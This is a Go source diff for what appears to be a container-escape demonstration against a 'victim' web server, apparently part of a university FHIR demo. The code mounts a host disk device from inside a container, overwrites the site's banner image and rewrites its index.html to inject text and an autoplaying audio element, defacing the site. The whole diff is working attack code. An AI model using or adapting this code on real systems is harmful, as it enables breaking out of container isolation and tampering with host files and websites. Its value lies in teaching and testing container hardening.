@@ -14,12 +14,13 @@ import (
 
 const (
 	mount_point       = "/mnt/foo"
-	mount_target      = "/dev/sda2"
+	mount_target      = "/dev/sdb1"
 	chief             = "./chief.png"
-	secret_dir        = "/media/d/git/nsysu/cs/fhir/demo/victim/swag/config/www/"
+	secret_dir        = "/git/nsysu/cs/fhir/demo/victim/swag/config/www/"
 	hack_image        = "banner.png"
 	hack_index        = "index.html"
 	pattern_signature = "Pattern passed:"
+	bgm_index         = 43
 )
 
 func overwrite_file(pattern string) error {
@@ -28,7 +29,7 @@ func overwrite_file(pattern string) error {
 		return errors.New("Open chief " + chief_err.Error())
 	}
 	defer src.Close()
-	img_dst, banner_err := os.Open(mount_point + secret_dir + hack_image)
+	img_dst, banner_err := os.Create(mount_point + secret_dir + hack_image)
 	if banner_err != nil {
 		return errors.New("Open banner " + banner_err.Error())
 	}
@@ -39,18 +40,26 @@ func overwrite_file(pattern string) error {
 		return errors.New("Copy chief to banner " + copy_err.Error())
 	}
 
-	// Add pattern
 	index_byte, index_err := ioutil.ReadFile(mount_point + secret_dir + hack_index)
 	if index_err != nil {
 		return errors.New("Open index " + index_err.Error())
 	}
 
+	// Add pattern
 	lines := strings.Split(string(index_byte), "\n")
 	for i, line := range lines {
 		if strings.Contains(line, pattern_signature) {
 			lines[i] = "Pattern passed: " + pattern
 		}
 	}
+
+	// Add BGM
+	for i, _ := range lines {
+		if i == bgm_index {
+			lines[i] += "<audio controls autoplay> <source src=\"bgm.mp3\" type=\"audio/mpeg\">Your browser does not support the audio element.</audio>"
+		}
+	}
+
 	output := strings.Join(lines, "\n")
 	pattern_err := ioutil.WriteFile(mount_point+secret_dir+hack_index, []byte(output), 0644)
 	if pattern_err != nil {
@@ -61,21 +70,20 @@ func overwrite_file(pattern string) error {
 }
 
 func do_escape(pattern string) string {
-
 	if err := syscall.Mkdir(mount_point, 0777); err != nil && err.Error() != "file exists" {
-		log.Fatalln("Mkdir " + err.Error())
+		log.Println("Mkdir", err.Error())
 		return err.Error()
 	}
 	defer syscall.Rmdir(mount_point)
 
 	if err := syscall.Mount(mount_target, mount_point, "ext4", syscall.MS_SYNCHRONOUS, ""); err != nil {
-		log.Fatalln("Mount " + err.Error())
+		log.Println("Mount", err.Error())
 		return err.Error()
 	}
 	defer syscall.Unmount(mount_point, 0)
 
 	if err := overwrite_file(pattern); err != nil {
-		log.Fatalln("Overwrite: " + err.Error())
+		log.Println("Overwrite:", err.Error())
 		return err.Error()
 	}
 
